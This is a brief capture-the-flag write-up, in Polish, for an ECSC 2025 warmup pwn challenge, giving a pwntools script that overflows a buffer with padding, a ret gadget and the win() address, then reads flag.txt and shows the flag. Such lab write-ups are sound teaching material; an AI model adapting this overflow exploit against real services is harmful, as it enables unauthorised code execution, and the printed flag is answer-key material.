# Warmup: Pwn - warmup - pwn

### Solution

Buffer Overflow w którym trzeba skoczyć do `win()`

```python
from pwn import remote, p64

r = remote("warmup.ecsc25.hack.cert.pl", 5210)

win_addr = 0x0000000000401176
ret_addr = 0x00000000004010ef

r.sendline(b"A" * 16 + b"B" * 8 + p64(ret_addr) + p64(win_addr))
r.sendline(b"cat flag.txt")
r.interactive() # ecsc25{pwn3d}
```
